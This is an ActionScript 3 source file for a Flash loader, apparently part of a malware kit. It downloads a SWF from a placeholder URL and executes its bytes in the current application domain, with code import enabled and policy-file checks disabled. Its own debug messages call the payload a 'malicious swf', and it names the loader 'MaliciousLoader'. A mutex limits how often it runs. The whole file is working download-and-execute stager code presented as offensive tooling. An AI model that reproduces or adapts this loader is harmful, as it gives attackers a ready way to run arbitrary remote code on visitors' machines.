package com.zzzz
{
	import flash.display.Sprite;
	import flash.display.Loader;
	import flash.events.SecurityErrorEvent;
	import flash.events.IOErrorEvent;
	import flash.events.Event;
	import flash.system.ApplicationDomain;
	import flash.system.Security;
	import flash.system.SecurityDomain;
	import flash.system.LoaderContext;
	import flash.net.URLRequest;
	import flash.net.URLRequestHeader;
	import flash.net.URLRequestMethod;
    import flash.net.URLLoader;
	import flash.net.URLVariables;
	import flash.net.URLLoaderDataFormat;
	import flash.utils.ByteArray;
	
	public class LoaderMain extends Sprite 
	{
		public function LoaderMain() 
		{
CONFIG::debug
{
			LoaderLogging.debug("=========================================================");
			LoaderLogging.debug("Loading loader.");
			LoaderLogging.debug("- PageDomain " + Security.pageDomain);
			LoaderLogging.debug("- SandboxType " + Security.sandboxType);
}

			// Check if we can load.
			if (!LoaderMutex.isAllowed()) {
CONFIG::debug
{
				LoaderLogging.debug("Not allowed to run, need more time.");
}
				return;
			}

			// Load SWF bytes from server.
			var date:Date = new Date();
			var request:URLRequest = new URLRequest("http://localhost/some.swf");
			request.method = URLRequestMethod.GET;
				
			var loader:URLLoader = new URLLoader();
			loader.dataFormat = URLLoaderDataFormat.BINARY;
			loader.addEventListener(Event.COMPLETE, this._loadComplete);
CONFIG::debug
{
			loader.addEventListener(IOErrorEvent.IO_ERROR, this._loadError);
			loader.addEventListener(SecurityErrorEvent.SECURITY_ERROR, this._loadErrorSecurity);
}
			loader.load(request);
		}
		
		private function _loadComplete(param1:Event):void
		{
CONFIG::debug
{
			LoaderLogging.debug("Fetched malicious swf. " + param1);
}

			// Load SWF bytes into ourself.
			var contentBytes:ByteArray = param1.target.data as ByteArray;
			
			var loaderContext:LoaderContext = new LoaderContext();
			loaderContext.allowCodeImport = true;
			loaderContext.checkPolicyFile = false;
			loaderContext.applicationDomain = ApplicationDomain.currentDomain;

			var loader:Loader = new Loader();

			loader.name = "MaliciousLoader";
			loader.contentLoaderInfo.addEventListener(Event.COMPLETE, function (param1:Event): void {
				LoaderMutex.save();
CONFIG::debug
{
				LoaderLogging.debug("Loaded swf. " + param1);
}
			});
			
CONFIG::debug
{
			loader.contentLoaderInfo.addEventListener(IOErrorEvent.IO_ERROR, function (param1:Event): void {
				LoaderLogging.debug("Faled to load swf. " + param1);
			});
			
			loader.contentLoaderInfo.addEventListener(SecurityErrorEvent.SECURITY_ERROR, function (param1:Event): void {
				LoaderLogging.debug("Failed to load swf (security). " + param1);
			});
}

			loader.loadBytes(contentBytes, loaderContext);
		}

CONFIG::debug
{
		private function _loadError(param1:Event):void
		{
			LoaderLogging.debug("Failed to fetch swf. " + param1);
		}

		private function _loadErrorSecurity(param1:SecurityErrorEvent):void
		{
			LoaderLogging.debug("Failed to fetch swf (security). " + param1);
		}
}
	}
}